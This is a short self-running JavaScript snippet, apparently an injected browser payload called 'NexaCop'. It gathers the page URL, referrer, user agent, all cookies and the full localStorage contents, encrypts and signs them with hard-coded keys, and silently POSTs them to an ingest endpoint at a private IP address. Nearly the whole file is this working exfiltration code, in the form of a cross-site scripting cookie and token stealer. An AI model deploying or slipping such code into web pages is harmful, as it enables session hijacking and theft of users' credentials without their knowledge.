(async () => {
  const AES_KEY = "YXNkZmFzZGZhc2RmYXNkZmFzZGZhc2Rm"; // same as your .env
  const HMAC_KEY = "ZGVtb2tleWZvcmhtYWNzaWduYXR1cmU=";

  function getPayload() {
    return {
      url: location.href,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      timestamp: new Date().toISOString(),
    };
  }

  async function encrypt(data, key) {
    const enc = new TextEncoder();
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const rawKey = Uint8Array.from(atob(key), c => c.charCodeAt(0));
    const cryptoKey = await crypto.subtle.importKey("raw", rawKey, "AES-GCM", false, ["encrypt"]);
    const encoded = enc.encode(JSON.stringify(data));
    const ciphertext = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cryptoKey, encoded);
    return {
      iv: btoa(String.fromCharCode(...iv)),
      enc: btoa(String.fromCharCode(...new Uint8Array(ciphertext))),
    };
  }

  async function hmac(data, key) {
    const enc = new TextEncoder();
    const rawKey = Uint8Array.from(atob(key), c => c.charCodeAt(0));
    const cryptoKey = await crypto.subtle.importKey("raw", rawKey, { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
    const signature = await crypto.subtle.sign("HMAC", cryptoKey, enc.encode(data));
    return Array.from(new Uint8Array(signature)).map(b => b.toString(16).padStart(2, "0")).join("");
  }

  async function send() {
    try {
      const payload = getPayload();
      const encrypted = await encrypt(payload, AES_KEY);
      const jsonData = JSON.stringify(encrypted);
      const signature = await hmac(jsonData, HMAC_KEY);

      await fetch("http://192.168.1.29:8000/api/v1/ingest", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Signature": signature,
        },
        body: jsonData,
      });
    } catch (e) {
      console.error("NexaCop error:", e);
    }
  }

  send();
})();
